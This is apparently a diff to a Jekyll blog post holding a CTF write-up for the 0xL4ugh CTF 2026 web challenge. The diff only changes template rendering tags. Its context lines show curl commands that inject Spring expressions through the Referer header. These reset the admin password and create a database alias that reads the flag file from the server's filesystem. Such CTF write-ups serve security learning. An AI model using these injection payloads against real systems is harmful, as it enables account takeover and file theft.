@@ -6,6 +6,7 @@ categories: [CTF, 0xL4ugh CTF 2026]
 tags: [Web]
 toc: true
 comments: false
+render_with_liquid: false
 ---
 
 ## TL;DR
@@ -103,24 +104,20 @@ export ADMINJWT="(token from webhook)"
 
 ### 5. Verify SSTI
 
-{% raw %}
 ```bash
 curl -s "$TARGET/api/admin/dashboard" \
   -H "Authorization: Bearer $ADMINJWT" \
   -H $'Referer: \x27 + ${7*7} + \x27' \
 | grep "49"
 ```
-{% endraw %}
 
 ### 6. Reset admin password via Spring beans
 
-{% raw %}
 ```bash
 curl -s "$TARGET/api/admin/dashboard" \
   -H "Authorization: Bearer $ADMINJWT" \
   -H $'Referer: \x27 + ${{#u=@userRepository.findByUsername("admin").get(),#u.setPassword(@passwordEncoder.encode("Admin!234567")),@userRepository.save(#u),"OK"}[3]} + \x27'
 ```
-{% endraw %}
 
 Login with the new password:
 
@@ -137,24 +134,20 @@ ADMIN_TOKEN="$(
 
 Create the alias:
 
-{% raw %}
 ```bash
 curl -s "$TARGET/api/admin/dashboard" \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG AS $$ String getflag() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); return p==null?"NF":java.nio.file.Files.readString(p); } } $$\')} + \x27'
 ```
-{% endraw %}
 
 Call it and get the flag:
 
-{% raw %}
 ```bash
 curl -s "$TARGET/api/admin/dashboard" \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H $'Referer: \x27 + ${@jdbcTemplate.queryForList(\'SELECT GETFLAG() AS F\')[0].get(\'F\')} + \x27' \
 | grep -oE "0xL4ugh\{[^}]+\}"
 ```
-{% endraw %}
 
 ---
 
@@ -168,7 +161,6 @@ curl -s "$TARGET/api/admin/dashboard" \
 
 ## solve.py
 
-{% raw %}
 ```python
 #!/usr/bin/env python3
 import argparse, json, re, sys, requests
@@ -224,7 +216,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-{% endraw %}
 
 **Usage:**
 ```bash
